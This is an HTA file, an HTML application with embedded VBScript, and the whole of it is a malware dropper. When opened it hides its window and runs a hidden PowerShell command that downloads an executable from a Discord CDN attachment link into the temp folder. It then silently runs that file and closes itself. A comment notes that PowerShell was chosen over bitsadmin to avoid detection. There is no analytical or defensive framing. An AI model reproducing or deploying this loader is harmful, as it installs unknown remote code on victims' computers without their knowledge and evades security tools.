<html>
<head>
<hta:application showintaskbar="no" caption="no" border="none" />
<script language="VBScript">
On Error Resume Next
Dim sh, fs, tmp, exe, ps

Set sh = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
tmp = fs.GetSpecialFolder(2)
exe = tmp & "\wd.exe"

' Download via PowerShell instead of bitsadmin (bitsadmin = instant ML flag)
ps = "powershell -w hidden -c ""$w=new-object net.webclient;$w.downloadfile('https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9&','" & exe & "')"""
sh.Run ps, 0, True

If fs.FileExists(exe) Then
    sh.Run """" & exe & """", 0, False
End If

Set sh = Nothing
Set fs = Nothing
window.close()
</script>
</head>
<body></body>
</html>
